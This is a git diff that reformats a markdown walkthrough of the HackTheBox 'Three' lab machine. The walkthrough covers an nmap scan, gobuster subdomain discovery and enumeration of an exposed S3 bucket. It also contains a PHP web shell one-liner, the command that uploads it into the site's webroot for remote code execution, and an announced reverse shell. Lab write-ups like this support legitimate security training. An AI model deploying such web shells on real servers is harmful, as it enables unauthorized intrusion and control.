@@ -2,15 +2,15 @@
 
 ![](/Assets/HTB/THREE/assets/three.jpg) 
 
-# Summary 
+# _**Summary**_ 
 
-* in this Box will new some steps in *cloud pentesting* and will know about *Amazon S3* and how we can know about its contents and how make our machine contact easily with it. 
+* _in this Box will new some steps in *cloud pentesting* and will know about *Amazon S3* and how we can know about its contents and how make our machine contact easily with it._ 
 
-# NMAP
+# _**NMAP**_
 ![](/Assets/HTB/THREE/assets/nmap.png)
 
-# Ports 
-we find port 22 for ssh connection and port 80 for http service will discover it , let's check it by browser . 
+# _**Ports**_ 
+_we find port 22 for ssh connection and port 80 for http service will discover it , let's check it by browser ._ 
 
 
 
@@ -18,55 +18,55 @@ we find port 22 for ssh connection and port 80 for http service will discover it
 
 
 
-By checking the web using web browser we find the static page and will check the **subdomains** for this host by using **gobuster** as follow .
+_By checking the web using web browser we find the static page and will check the **subdomains** for this host by using **gobuster** as follow ._
 
-**NOTE** : add ip of machine in **/etc/hosts** 
+_**NOTE** : add ip of machine in **/etc/hosts**_ 
 
-like that  echo **"10.129.10.31 thetoppers.htb" | sudo tee -a /etc/hosts**
+_like that  echo **"10.129.10.31 thetoppers.htb" | sudo tee -a /etc/hosts**_
 
 ![](/Assets/HTB/THREE/assets/gobuster.png)
 
-we found subdomain will be foucs with it **s3.thetoppers.htb** by search on google about it , will find info about **amazon s3 cloud storage**
+_we found subdomain will be foucs with it **s3.thetoppers.htb** by search on google about it , will find info about **amazon s3 cloud storage**_
 
 ![](/Assets/HTB/THREE/assets/s3amazon.png)
 
-_**NOTE**_  we should add the subdomain **s3.thetopper.htb** in /etc/hosts like that 
+_**NOTE**  we should add the subdomain **s3.thetopper.htb** in /etc/hosts like that_ 
 
 
 ![](/Assets/HTB/THREE/assets/response.png)
 
-The webpage only contains the perivous JSON.
+_The webpage only contains the perivous JSON._
 
-We can interact with this S3 bucket with the aid of the **awscli** utility. It can be installed on Linux using the command **apt install awscli** 
+_We can interact with this S3 bucket with the aid of the **awscli** utility. It can be installed on Linux using the command **apt install awscli**_
 
-First, we need to configure it using the following command. **aws configure**
+_First, we need to configure it using the following command. **aws configure**_
 
 ![](/Assets/HTB/THREE/assets/ls.png)
 
-We can list all of the S3 buckets hosted by the server by using the ls command.
+_We can list all of the S3 buckets hosted by the server by using the ls command._
 
 **aws --endpoint=http://s3.thetoppers.htb s3 ls**
 
-We see the files index.php , .htaccess and a directory called images in the specified bucket. It seems like
+_We see the files index.php , .htaccess and a directory called images in the specified bucket. It seems like
 this is the webroot of the website running on port 80 . So the Apache server is using this S3 bucket as
-storage.
+storage._
 
-**awscli** has got another feature that allows us to copy files to a remote bucket. We already know that the
+_**awscli** has got another feature that allows us to copy files to a remote bucket. We already know that the
 website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to
 the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
-will achieve remote code execution.
+will achieve remote code execution._
 
 
 _We can use the following PHP one-liner which uses the system() function which takes the URL parameter
-cmd as an input and executes it as a system command
+cmd as an input and executes it as a system command._
 
 **<?php system($_GET["cmd"]); ?>**
 
-then make file php 
+_then make file php_
 
 **echo '<?php system($_GET["cmd"]); ?>' > shell.php**
 
-Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command
+_Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command_
 
 
 **aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb**
@@ -86,7 +86,7 @@ command._
 
 
 _Let's get a reverse shell by creating a new file shell.sh containing the following bash reverse shell payload
-which will connect back to our local machine on port 1337 .
+which will connect back to our local machine on port 1337 ._
 
 
 
